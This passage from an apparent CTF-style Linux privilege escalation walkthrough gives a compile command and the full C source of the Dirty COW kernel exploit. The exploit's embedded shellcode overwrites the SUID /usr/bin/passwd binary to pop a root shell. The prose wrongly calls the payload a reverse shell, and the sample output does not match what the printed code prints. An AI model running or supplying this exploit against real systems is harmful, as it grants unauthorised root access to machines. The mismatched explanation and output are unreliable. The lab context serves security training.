    Source: http://www.exploit-db.com/exploits/15024{% endraw %}{% endcapture %} {% include code.html code=code %}

The current kernel is vulnerable to `dirty cow` exploit.

Compile the code to exploit the kernel vulnerability.
{% capture code %}{% raw %}gcc -pthread /home/user/tools/kernel-exploits/dirtycow/c0w.c -o c0w{% endraw %}{% endcapture %} {% include code.html code=code %}

The exploit code is similar to below.
{% capture code %}{% raw %}#include <stdio.h>
#include <stdlib.h>
#include <sys/mman.h>
#include <fcntl.h>
#include <pthread.h>
#include <string.h>
#include <unistd.h>

void *map;
int f;
int stop = 0;
struct stat st;
char *name;
pthread_t pth1,pth2,pth3;

char suid_binary[] = "/usr/bin/passwd";

/* $ msfvenom -p linux/x64/exec CMD=/bin/bash PrependSetuid=True -f elf | xxd -i */
unsigned char sc[] = {
  0x7f, 0x45, 0x4c, 0x46, 0x02, 0x01, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00,
  0x00, 0x00, 0x00, 0x00, 0x02, 0x00, 0x3e, 0x00, 0x01, 0x00, 0x00, 0x00,
  0x78, 0x00, 0x40, 0x00, 0x00, 0x00, 0x00, 0x00, 0x40, 0x00, 0x00, 0x00,
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
  0x00, 0x00, 0x00, 0x00, 0x40, 0x00, 0x38, 0x00, 0x01, 0x00, 0x00, 0x00,
  0x00, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x07, 0x00, 0x00, 0x00,
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x40, 0x00,
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x40, 0x00, 0x00, 0x00, 0x00, 0x00,
  0xb1, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xea, 0x00, 0x00, 0x00,
  0x00, 0x00, 0x00, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
  0x48, 0x31, 0xff, 0x6a, 0x69, 0x58, 0x0f, 0x05, 0x6a, 0x3b, 0x58, 0x99,
  0x48, 0xbb, 0x2f, 0x62, 0x69, 0x6e, 0x2f, 0x73, 0x68, 0x00, 0x53, 0x48,
  0x89, 0xe7, 0x68, 0x2d, 0x63, 0x00, 0x00, 0x48, 0x89, 0xe6, 0x52, 0xe8,
  0x0a, 0x00, 0x00, 0x00, 0x2f, 0x62, 0x69, 0x6e, 0x2f, 0x62, 0x61, 0x73,
  0x68, 0x00, 0x56, 0x57, 0x48, 0x89, 0xe6, 0x0f, 0x05
};
unsigned int sc_len = 177;

/*
* $ msfvenom -p linux/x86/exec CMD=/bin/bash PrependSetuid=True -f elf | xxd -i
unsigned char sc[] = {
  0x7f, 0x45, 0x4c, 0x46, 0x01, 0x01, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00,
  0x00, 0x00, 0x00, 0x00, 0x02, 0x00, 0x03, 0x00, 0x01, 0x00, 0x00, 0x00,
  0x54, 0x80, 0x04, 0x08, 0x34, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
  0x00, 0x00, 0x00, 0x00, 0x34, 0x00, 0x20, 0x00, 0x01, 0x00, 0x00, 0x00,
  0x00, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
  0x00, 0x80, 0x04, 0x08, 0x00, 0x80, 0x04, 0x08, 0x88, 0x00, 0x00, 0x00,
  0xbc, 0x00, 0x00, 0x00, 0x07, 0x00, 0x00, 0x00, 0x00, 0x10, 0x00, 0x00,
  0x31, 0xdb, 0x6a, 0x17, 0x58, 0xcd, 0x80, 0x6a, 0x0b, 0x58, 0x99, 0x52,
  0x66, 0x68, 0x2d, 0x63, 0x89, 0xe7, 0x68, 0x2f, 0x73, 0x68, 0x00, 0x68,
  0x2f, 0x62, 0x69, 0x6e, 0x89, 0xe3, 0x52, 0xe8, 0x0a, 0x00, 0x00, 0x00,
  0x2f, 0x62, 0x69, 0x6e, 0x2f, 0x62, 0x61, 0x73, 0x68, 0x00, 0x57, 0x53,
  0x89, 0xe1, 0xcd, 0x80
};
unsigned int sc_len = 136;
*/

void *madviseThread(void *arg)
{
  char *str;
  str=(char*)arg;
  int i,c=0;
  for(i=0;i<1000000 && !stop;i++) {
    c+=madvise(map,100,MADV_DONTNEED);
  }
  printf("thread stopped\n");
}

void *procselfmemThread(void *arg)
{
  char *str;
  str=(char*)arg;
  int f=open("/proc/self/mem",O_RDWR);
  int i,c=0;
  for(i=0;i<1000000 && !stop;i++) {
    lseek(f,map,SEEK_SET);
    c+=write(f, str, sc_len);
  }
  printf("thread stopped\n");
}

void *waitForWrite(void *arg) {
  char buf[sc_len];

  for(;;) {
    FILE *fp = fopen(suid_binary, "rb");

    fread(buf, sc_len, 1, fp);

    if(memcmp(buf, sc, sc_len) == 0) {
      printf("%s is overwritten\n", suid_binary);
      break;
    }

    fclose(fp);
    sleep(1);
  }

  stop = 1;

  printf("Popping root shell.\n");
  printf("Don't forget to restore /tmp/bak\n");

  system(suid_binary);
}

int main(int argc,char *argv[]) {
  char *backup;

  printf("DirtyCow root privilege escalation\n");
  printf("Backing up %s.. to /tmp/bak\n", suid_binary);

  asprintf(&backup, "cp %s /tmp/bak", suid_binary);
  system(backup);

  f = open(suid_binary,O_RDONLY);
  fstat(f,&st);

  printf("Size of binary: %d\n", st.st_size);

  char payload[st.st_size];
  memset(payload, 0x90, st.st_size);
  memcpy(payload, sc, sc_len+1);

  map = mmap(NULL,st.st_size,PROT_READ,MAP_PRIVATE,f,0);

  printf("Racing, this may take a while..\n");

  pthread_create(&pth1, NULL, &madviseThread, suid_binary);
  pthread_create(&pth2, NULL, &procselfmemThread, payload);
  pthread_create(&pth3, NULL, &waitForWrite, NULL);

  pthread_join(pth3, NULL);

  return 0;
}{% endraw %}{% endcapture %} {% include code.html code=code %}

The `dirty cow` exploit creates a binary, which back up `/usr/bin/passwd` file and creates a `reverse shell` payload in the same name. A `privilege shell` will be spawned when the command `/usr/bin/passwd` is executed.

The output of command `./c0w` is similar to below
{% capture code %}{% raw %}DirtyCow root privilege escalation
Backing up /usr/bin/passwd to /tmp/bak
mmap 249f7000

madvise 0

ptrace 0{% endraw %}{% endcapture %} {% include code.html code=code %}


## Task 21 - Privilege Escalation Scripts

Use these links as references.
- [LinEnum reference](https://github.com/rebootuser/LinEnum){:target="_blank"}
- [Privilege Escalation Suite](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite){:target="_blank"}
- [Linux Smart Enumeration](https://github.com/diego-treitos/linux-smart-enumeration){:target="_blank"}

